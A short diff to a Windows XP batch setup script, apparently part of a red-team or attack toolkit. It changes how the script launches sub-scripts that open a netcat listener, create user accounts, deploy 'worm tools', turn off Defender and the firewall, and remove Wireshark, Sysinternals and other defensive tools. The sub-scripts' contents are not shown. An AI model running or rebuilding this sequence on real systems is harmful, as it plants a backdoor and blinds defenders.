@@ -2,13 +2,13 @@
 ::setup scripting for Windows Xp tools
 
 start /b netcatlistener.bat
-start /b createUsers.bat
-start /b wormtools.bat
-start /b disableDefender.bat
-start /b disablefirewall.bat
-start /b removeKillers.bat
-start /b removeNetworkTools.bat
-start /b removeSYSinternals.bat
-start /b removewireshark.bat
-start /b renameCliNetworkTools.bat
-start /b disableGUI.bat
+call createUsers.bat
+call wormtools.bat
+call disableDefender.bat
+call disablefirewall.bat
+call removeKillers.bat
+call removeNetworkTools.bat
+call removeSYSinternals.bat
+call removewireshark.bat
+call renameCliNetworkTools.bat
+call disableGUI.bat
